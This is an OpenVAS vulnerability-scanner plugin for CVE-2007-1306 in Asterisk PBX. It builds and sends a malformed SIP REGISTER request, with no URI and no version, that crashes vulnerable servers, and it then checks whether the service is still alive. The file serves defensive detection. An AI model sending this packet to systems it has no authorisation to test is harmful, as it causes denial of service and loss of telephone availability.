###############################################################################
# OpenVAS Vulnerability Test
# $Id: asterisk_null_pointer_dereference.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Asterisk PBX NULL Pointer Dereference Overflow
#
# Authors:
# Ferdy Riphagen
#
# Copyright:
# Copyright (C) 2008 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Note:
# Because of many systems using safe_asterisk to watchdog
# the asterisk running process, this check could be
# false negative prone.

CPE = 'cpe:/a:digium:asterisk';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.9999991");
  script_version("$Revision: 13994 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_cve_id("CVE-2007-1306");
  script_bugtraq_id(22838);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("Asterisk PBX NULL Pointer Dereference Overflow");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("secpod_asterisk_detect.nasl");
  script_mandatory_keys("Asterisk-PBX/Installed");

  script_xref(name:"URL", value:"http://labs.musecurity.com/advisories/MU-200703-01.txt");
  script_xref(name:"URL", value:"http://asterisk.org/node/48320");
  script_xref(name:"URL", value:"http://asterisk.org/node/48319");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/228032");

  script_tag(name:"solution", value:"Upgrade to Asterisk PBX release 1.4.1 or 1.2.16.");

  script_tag(name:"summary", value:"The host host appears to be running Asterisk PBX which
  is prone to a remote buffer overflow.");

  script_tag(name:"insight", value:"The application suffers from a null pointer dereference overflow in
  the SIP service.");

  script_tag(name:"impact", value:"When sending an mailformed SIP packet with no URI and version in the
  request an attacker can trigger a Denial of Service and shutdown the application resulting in a loss
  of availability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("sip.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! infos = get_app_location_and_proto( cpe:CPE, port:port ) )
  exit( 0 );

proto = infos["proto"];
if( ! sip_alive( port:port, proto:proto ) )
  exit( 0 );

vtstrings = get_vt_strings();
from_default = vtstrings["default"];
from_lower   = vtstrings["lowercase"];

bad_register = string(
    "REGISTER\r\n",
    "Via: SIP/2.0/", toupper( proto ), " ", this_host(), ":", port, "\r\n",
    "To: User <sip:user@", get_host_name(), ":", port, ">\r\n",
    "From: ", from_default, " <sip:", from_lower, "@", this_host(), ":", port, ">\r\n",
    "Call-ID: ", rand(), "\r\n",
    "CSeq: ", rand(), " OPTIONS\r\n",
    "Contact: ", from_default, " <sip:", from_lower, "@", this_host(), ":", port, ">\r\n",
    "Max-Forwards: 0\r\n",
    "Accept: application/sdp\r\n",
    "Content-Length: 0\r\n\r\n");

exp = sip_send_recv( port:port, data:bad_register, proto:proto );
if( isnull( exp ) ) {
  if( ! sip_alive( port:port, proto:proto ) ) {
    security_message( port:port, proto:proto );
    exit( 0 );
  }
}

exit( 99 );